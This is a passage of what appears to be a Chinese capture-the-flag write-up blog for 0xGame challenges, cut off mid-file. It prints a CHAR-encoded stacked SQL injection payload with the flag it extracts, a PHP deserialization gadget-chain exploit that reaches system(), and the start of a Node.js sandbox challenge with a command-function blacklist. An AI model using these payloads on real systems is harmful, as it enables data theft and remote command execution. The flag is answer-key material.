class="hljs-number">97</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">44</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">48</span>,<span class="hljs-number">120</span>,<span class="hljs-number">55</span>,<span class="hljs-number">101</span>,<span class="hljs-number">44</span>,<span class="hljs-number">40</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">109</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">108</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">105</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">59</span>);<br><span class="hljs-keyword">PREPARE</span> hello <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">EXECUTE</span> hello;#<br><br></code></pre></td></tr></table></figure><p><code>SET @a=CHAR(115,101,108,101,99,116,32,101,120,116,114,97,99,116,118,97,108,117,101,40,49,44,99,111,110,99,97,116,40,48,120,55,101,44,40,115,101,108,101,99,116,32,102,108,97,103,32,102,114,111,109,32,102,108,97,103,32,108,105,109,105,116,32,48,44,49,41,41,41,59);PREPARE/**/hello/**/FROM/**/@a;EXECUTE/**/hello;</code></p><p><img src="/img/sqli1.png" alt="sqli1"></p><p>返回：<code>XPATH syntax error: &#39;~0xGame&#123;4286b62d-c37e-4010-ba9c-&#39;&quot;)</code>,没显示完全，好像因为报错函数只能显示32位？改下<code>payload</code>让它显示<code>flag</code>的后30位：<code>flag</code>-&gt;<code>(right(flag,30))</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?<span class="hljs-keyword">order</span><span class="hljs-operator">=</span>email;<span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">97</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">44</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">48</span>,<span class="hljs-number">120</span>,<span class="hljs-number">55</span>,<span class="hljs-number">101</span>,<span class="hljs-number">44</span>,<span class="hljs-number">40</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">40</span>,<span class="hljs-number">114</span>,<span class="hljs-number">105</span>,<span class="hljs-number">103</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">44</span>,<span class="hljs-number">51</span>,<span class="hljs-number">48</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">109</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">108</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">105</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">59</span>);<span class="hljs-keyword">PREPARE</span><span class="hljs-comment">/**/</span>hello<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">EXECUTE</span><span class="hljs-comment">/**/</span>hello;<br></code></pre></td></tr></table></figure><p><img src="/img/sqli2.png" alt="sqli2"></p><p>拼起来得到<code>flag</code>:<code>0xGame&#123;4286b62d-c37e-4010-ba9c-35d47641fb91&#125;</code></p><h3 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="[Week 2] ez_unserialize"></a>[Week 2] ez_unserialize</h3><p>这题没做出来挺可惜的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$helper</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$value</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-variable">$helper</span>;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;expired = False;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//强行把expired设置False，之前碰到都是利用修改属性个数绕过，但师傅提示需通过引用绕过</span><br>        <span class="hljs-variable language_">$this</span>-&gt;expired = False;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">expired</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;expired) &#123; <span class="hljs-comment">//如果expired为True</span><br>            <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;<span class="hljs-title function_ invoke__">clean</span>(<span class="hljs-variable">$this</span>-&gt;key);<span class="hljs-comment">//clean?好像是一个不存在的方法，通过这个调用__call</span><br>            <span class="hljs-keyword">return</span> True; <span class="hljs-comment">//返回True</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();<span class="hljs-comment">//将一个空数组赋值给store</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<span class="hljs-comment">//给不可访问属性赋值时被调用</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;store) <br>            <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">expired</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;store[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-variable">$funcs</span>;<span class="hljs-comment">//system函数</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$args</span></span>) </span>&#123; <span class="hljs-comment">//链子的尾，通过这个执行命令</span><br>        <span class="hljs-variable language_">$this</span>-&gt;funcs[<span class="hljs-variable">$name</span>](...<span class="hljs-variable">$args</span>);  <span class="hljs-comment">//system(&#x27;ls&#x27;)等？</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//链子的头</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;data <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<span class="hljs-comment">//遍历data数组，键key值value</span><br>            <span class="hljs-variable language_">$this</span>-&gt;storage-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<span class="hljs-comment">//将storage对象的$key属性赋值为$value,注意此时可以去触发Storage的__set方法.(给不可访问的属性赋值)</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<span class="hljs-comment">//反序列化</span><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br>    <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br>    <br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataObject</span>();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Storage</span>();<br>    <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br>    <span class="hljs-variable">$c</span> -&gt; expired = False;<br>    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br>    <span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>();<br>    <span class="hljs-variable">$a</span>-&gt; data = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;key1&#x27;</span> =&gt; <span class="hljs-variable">$c</span>, <span class="hljs-string">&#x27;key2&#x27;</span> =&gt; <span class="hljs-variable">$d</span>);<span class="hljs-comment">//放入Cache1和Cache2，两个实例</span><br>    <span class="hljs-variable">$a</span>-&gt; storage = <span class="hljs-variable">$b</span>; <span class="hljs-comment">//这里触发了Storage中的__set方法</span><br>    <span class="hljs-variable">$b</span>-&gt; store = &amp;<span class="hljs-variable">$d</span>-&gt;expired;<span class="hljs-comment">//通过引用赋值绕过__wakeup，store和$d指向相同的内存地址</span><br>    <span class="hljs-variable">$d</span> -&gt; key = <span class="hljs-string">&#x27;id&#x27;</span>;<br>    <span class="hljs-variable">$d</span>-&gt; helper = <span class="hljs-variable">$e</span>;<br>    <span class="hljs-variable">$e</span>-&gt; <span class="hljs-variable">$funcs</span> = [<span class="hljs-string">&#x27;clean&#x27;</span> =&gt; <span class="hljs-string">&#x27;system&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><br>DataObject.__destruct<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Storage.__set<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Cache.expired<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Helper.__call()<br><br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">参考文章:ttps:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">377676274</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">pear:</span><br><span class="hljs-symbol">https:</span>//longlone.top/<span class="hljs-variable">%E5</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%85</span><span class="hljs-variable">%A8</span>/<span class="hljs-variable">%E5</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%85</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%94</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%B6</span>/register_argc_argv<span class="hljs-variable">%E4</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%8</span>Einclude<span class="hljs-variable">%20</span><span class="hljs-keyword">to</span><span class="hljs-variable">%20</span>RCE<span class="hljs-variable">%E7</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%84</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%99</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%84</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%90</span><span class="hljs-variable">%88</span>/<br><span class="hljs-symbol">https:</span>//blog.csdn.net/RABCDXB/article/details/<span class="hljs-number">122050370</span><br><br></code></pre></td></tr></table></figure><h3 id="Week-2-ez-sandbox"><a href="#Week-2-ez-sandbox" class="headerlink" title="[Week 2] ez_sandbox"></a>[Week 2] ez_sandbox</h3><p><code>app.js</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>)<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>()<br><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>    <span class="hljs-attr">secret</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">64</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">true</span><br>&#125;))<br><br><span class="hljs-keyword">var</span> users = &#123;&#125;<br><span class="hljs-keyword">var</span> admins = &#123;&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123; <span class="hljs-comment">//merge，原型链污染</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<span class="hljs-comment">//这里过滤了__protp__</span><br>            <span class="hljs-keyword">continue</span><span class="hljs-comment">//中断迭代，进入下一次循环</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> target<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">source</span>) &#123; <span class="hljs-comment">//同上</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, source)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">let</span> blacklist = [<span class="hljs-string">&#x27;constructor&#x27;</span>, <span class="hljs-string">&#x27;mainModule&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;child_process&#x27;</span>, <span class="hljs-string">&#x27;process&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execSync&#x27;</span>, <span class="hljs-string">&#x27;execFile&#x27;</span>, <span class="hljs-string">&#x27;execFileSync&#x27;</span>, <span class="hljs-string">&#x27;spawn&#x27;</span>, <span class="hljs-string">&#x27;spawnSync&#x27;</span>, <span class="hljs-string">&#x27;fork&#x27;</span>]<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v <span class="hljs-keyword">of</span> blacklist) &#123;<br>        <span class="hljs-keyword">if</span> (code.<span class="hljs-title function_">includes</span>(v)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(v + <span class="hljs-string">&#x27; is banned&#x27;</span>)<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">requireLogin</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>) &#123;<br>        res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_">next</span>()<br>    &#125;<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[key]<br>    &#125;<br>    <span class="hljs-title function_">next</span>()<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/index.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + 